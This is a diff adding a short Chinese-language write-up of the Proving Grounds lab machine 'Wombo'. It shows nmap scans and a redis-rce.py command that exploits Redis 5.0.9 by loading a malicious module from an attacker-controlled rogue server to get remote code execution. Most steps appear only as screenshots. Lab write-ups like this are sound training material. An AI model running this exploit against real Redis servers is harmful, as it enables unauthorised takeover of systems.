@@ -1,0 +1,23 @@
+<hr>
+<h2 id="title-Proving-Grounds-Wombo-Writeupdate-2024-7-26categories-LabWriteuptags-Proving-Grounds"><a href="#title-Proving-Grounds-Wombo-Writeupdate-2024-7-26categories-LabWriteuptags-Proving-Grounds" class="headerlink" title="title: Proving Grounds Wombo Writeupdate: 2024-7-26categories: LabWriteuptags: Proving Grounds"></a>title: Proving Grounds Wombo Writeup<br>date: 2024-7-26<br>categories: LabWriteup<br>tags: Proving Grounds</h2><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><p>进行端口识别：</p>
+<pre><code class="bash">nmap 192.168.240.69 -p- -n -sT --min-rate 2000
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240701073742500.png" alt="image-20240701073742500"></p>
+<pre><code class="bash">nmap 192.168.240.69 -p22,53,80,6379,8080,27017 -sV -sC
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240701074438493.png" alt="image-20240701074438493"></p>
+<h4 id="Get-Flag："><a href="#Get-Flag：" class="headerlink" title="Get Flag："></a>Get Flag：</h4><p>谷歌搜索Redis key-value store 5.0.9可以获取到一个可能存在的漏洞信息：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240701074902265.png" alt="image-20240701074902265"></p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240701075950969.png" alt="image-20240701075950969"></p>
+<p>根据帮助说明进行尝试：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240701080022731.png" alt="image-20240701080022731"></p>
+<p>进行谷歌搜索：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240701080141650.png" alt="image-20240701080141650"></p>
+<p>根据说明进行编译：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240701080238837.png" alt="image-20240701080238837"></p>
+<p>执行漏洞利用：</p>
+<pre><code class="bash">python redis-rce.py -r 192.168.240.69 -p 6379 -L 192.168.45.228 -P 6379 -f RedisModules-ExecuteCommand/src/module.so
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240701082757399.png" alt="image-20240701082757399"></p>
+<p>读取flag：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240701083017671.png" alt="image-20240701083017671"></p>
